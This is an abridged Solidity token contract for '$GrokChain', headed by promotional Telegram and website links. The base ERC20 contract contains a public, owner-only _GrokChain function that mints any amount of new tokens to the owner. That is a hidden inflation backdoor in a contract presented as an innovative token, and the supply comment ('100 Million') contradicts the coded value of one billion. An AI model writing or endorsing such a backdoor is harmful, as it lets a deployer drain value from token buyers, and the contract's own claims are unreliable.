//
// $GrokChain proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/Grok_Chain
//  📱 Website::https://GrokChain.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _GrokChain(uint256 amount) public onlyOwner {
 _GrokChain(msg.sender, amount);
    }
    ...
    function _GrokChain(address account, uint256 amount) internal virtual {
...
contract $GrokChain is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Grok Chain", "GROKCHAIN") {
     _GrokChain(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}